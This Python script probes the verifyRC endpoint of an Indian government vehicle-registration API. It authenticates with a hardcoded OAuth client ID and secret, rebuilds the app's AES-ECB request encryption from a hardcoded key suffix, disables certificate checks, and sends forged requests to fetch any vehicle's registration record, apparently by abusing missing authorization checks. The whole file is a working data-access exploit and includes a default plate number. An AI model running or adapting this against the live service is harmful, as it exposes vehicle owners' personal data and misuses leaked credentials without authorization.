#!/usr/bin/env python3
"""
Probe nrapi/service/verifyRC — used in the citizen traffic-violation reporting
flow to verify someone else's vehicle.  Because the citizen is reporting a
third party's vehicle, the server may only check the Bearer token and not
validate that recordId maps to a real account.

Usage:
    python3 try_verifyrc.py <RC_NUMBER>           # auto-fetches token
    python3 try_verifyrc.py <RC_NUMBER> <TOKEN>   # reuse an existing token
"""

import base64
import json
import sys
import time

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

try:
    import ssl
    import requests
    from requests.adapters import HTTPAdapter
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    class _TLSAdapter(HTTPAdapter):
        def init_poolmanager(self, *a, **kw):
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
            ctx.set_ciphers(
                "ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:"
                "ECDH+AES128:DH+AES:RSA+AESGCM:RSA+AES:!aNULL:!MD5:!DSS"
            )
            kw["ssl_context"] = ctx
            super().init_poolmanager(*a, **kw)

    _SESSION = requests.Session()
    _SESSION.mount("https://", _TLSAdapter())
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    _SESSION = None

# ── constants ────────────────────────────────────────────────────────────────
OAUTH_URL      = "https://delhigw.napix.gov.in/nic/parivahan/oauth2/token"
NRAPI_BASE     = "https://delhigw.napix.gov.in/nic/parivahan/mparivahan/nrapi/"
VERIFY_EP      = "service/verifyRC"
CLIENT_ID      = "b91c303443f61b37106750823881cd2f"
CLIENT_SECRET  = "de83eeeb148878ae375f28756492e8a0"
PAYMENT_SUFFIX = "!~)#@*&^"

# ── AES-128/ECB/PKCS7 + double Base64 ───────────────────────────────────────
def derive_key(ts: str) -> bytes:
    rev  = ts[::-1]
    part = rev[:4] + rev[len(rev) - 4:]
    return (part + PAYMENT_SUFFIX).encode("utf-8")

def encrypt_body(plain: str, ts: str) -> str:
    ct = AES.new(derive_key(ts), AES.MODE_ECB).encrypt(pad(plain.encode(), 16))
    return base64.b64encode(base64.b64encode(ct)).decode()

def decrypt_response(data_b64: str, ts: str) -> str:
    try:
        ct = base64.b64decode(base64.b64decode(data_b64))
        pt = unpad(AES.new(derive_key(ts), AES.MODE_ECB).decrypt(ct), 16)
        return pt.decode("utf-8")
    except Exception as e:
        return f"<decryption failed: {e}>"

# ── OAuth token ───────────────────────────────────────────────────────────────
def fetch_token():
    print(">> Fetching OAuth token ...")
    resp = _SESSION.post(OAUTH_URL, data={
        "grant_type":    "client_credentials",
        "scope":         "napix",
        "client_id":     CLIENT_ID,
        "client_secret": CLIENT_SECRET,
    }, timeout=15, verify=False)
    print(f"   HTTP {resp.status_code}")
    try:
        token = resp.json().get("access_token")
        if token:
            print(f"   Token: {token[:50]}...")
            return token
        print("   Response:", resp.text[:300])
    except Exception:
        print("   Raw:", resp.text[:300])
    return None

# ── verifyRC probe ────────────────────────────────────────────────────────────
def try_verifyrc(rc: str, bearer: str):
    ts = str(int(time.time() * 1000))

    plain = json.dumps({
        "rcNumber": rc,
        "recordId": 1,
        "did":      "0000000000000000",
        "mid":      "0000000000",
        "tid":      "",
    }, separators=(",", ":"))

    body    = json.dumps({"data": encrypt_body(plain, ts)})
    url     = NRAPI_BASE + VERIFY_EP
    headers = {
        "Content-Type": "application/json",
        "Accept":       "application/json",
        "timestamp":    ts,
        "Param2":       "2.0.135",
        "Param1":       "",
    }
    if bearer:
        headers["Authorization"] = f"Bearer {bearer}"

    print(f"\n{'='*60}")
    print(f"  RC        : {rc}")
    print(f"  ENDPOINT  : {url}")
    print(f"  AES KEY   : {derive_key(ts).decode()}")
    print(f"  PLAIN BODY: {plain}")
    print(f"{'='*60}\n")

    if not HAS_REQUESTS:
        print("(requests not installed)\n")
        print(f"curl -X POST '{url}' \\")
        for k, v in headers.items():
            print(f"  -H '{k}: {v}' \\")
        print(f"  -d '{body}'")
        return

    print(">> Firing verifyRC request ...")
    try:
        resp = _SESSION.post(url, headers=headers, data=body, timeout=15, verify=False)
        print(f"HTTP {resp.status_code}\n")
        try:
            rj = resp.json()
            print("Encrypted response:", json.dumps(rj, indent=2))
            if "data" in rj:
                print("\nDECRYPTED:", decrypt_response(rj["data"], ts))
        except Exception:
            print("Raw:", resp.text[:500])
    except requests.exceptions.Timeout:
        print("ERROR: timed out")
    except Exception as e:
        print(f"ERROR: {e}")


if __name__ == "__main__":
    rc     = sys.argv[1] if len(sys.argv) > 1 else "WB74AN9717"
    bearer = sys.argv[2] if len(sys.argv) > 2 else ""

    if not bearer:
        bearer = fetch_token() or ""

    try_verifyrc(rc, bearer)
